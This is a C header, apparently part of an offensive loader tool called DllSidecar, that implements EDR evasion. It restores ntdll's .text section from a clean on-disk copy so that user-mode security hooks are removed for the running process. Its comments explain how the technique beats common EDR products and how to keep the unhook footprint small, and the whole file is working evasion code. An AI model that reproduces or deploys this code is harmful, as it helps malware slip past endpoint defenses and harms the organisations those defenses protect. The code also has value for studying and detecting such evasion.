/*
 * DllSidecar — unhook.h
 * Restore ntdll's .text section from a pristine on-disk copy. User-mode
 * EDRs hook Nt* functions by overwriting the first bytes of each stub
 * with a JMP into their inspection routines; mapping the file fresh and
 * memcpy'ing back the original code removes those hooks for the rest of
 * this process's lifetime.
 *
 * Trade-off: the unhook procedure itself uses kernel32 wrappers
 * (CreateFile, CreateFileMapping, MapViewOfFile, VirtualProtect) whose
 * implementations call into ntdll. If the very Nt* used to do the unhook
 * are themselves hooked aggressively enough to drop the call, the unhook
 * is bypassed. In practice, most EDRs hook Nt* the generator's syscall
 * paths use (NtAllocateVirtualMemory, NtProtectVirtualMemory,
 * NtCreateThreadEx) and leave file-mapping / VirtualProtect alone — so
 * this Win32-based approach succeeds against the common case.
 *
 * Arch-independent. On WoW64 the System32 path is silently redirected to
 * SysWOW64 by the loader, so the same literal works for x86 builds.
 *
 * @tunelko — BugAInters 2026
 */

#ifndef UNHOOK_H
#define UNHOOK_H

#include <windows.h>
#include "dinvoke.h"

/* Locate the in-process .text section by walking PE headers, then overwrite
 * it with the freshly mapped copy. Both mappings are SEC_IMAGE, so the
 * VirtualAddress and VirtualSize fields are identical between them — using
 * the in-process headers to compute offsets is safe to apply to the fresh
 * copy too. */
static void unhook_ntdll(void) {
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }

    PVOID freshBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!freshBase) { CloseHandle(hMap); CloseHandle(hFile); return; }

    PVOID realBase = dinvoke_get_module(H_NTDLL_DLL);
    if (!realBase) goto cleanup;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)realBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)realBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        /* Compare the first 5 bytes of the 8-byte zero-padded section name
         * against ".text". Section names that happen to begin with ".text"
         * (e.g. ".textbss" on debug builds) are rare in ntdll but harmless
         * to skip since the canonical ".text" comes first in the table. */
        if (sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
            sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
            sec[i].Name[4] == 't' && sec[i].Name[5] == 0)
        {
            BYTE *realText  = (BYTE *)realBase  + sec[i].VirtualAddress;
            BYTE *freshText = (BYTE *)freshBase + sec[i].VirtualAddress;
            DWORD textSize  = sec[i].Misc.VirtualSize;

            DWORD oldProtect;
            if (VirtualProtect(realText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                /* RtlCopyMemory is the inlinable memcpy alias from winnt.h.
                 * Avoid a CRT memcpy call here so the unhook footprint stays
                 * minimal and we don't reintroduce an import an EDR might
                 * have hooked. */
                RtlCopyMemory(realText, freshText, textSize);
                DWORD dummy;
                VirtualProtect(realText, textSize, oldProtect, &dummy);
            }
            break;
        }
    }

cleanup:
    UnmapViewOfFile(freshBase);
    CloseHandle(hMap);
    CloseHandle(hFile);
}

#endif /* UNHOOK_H */
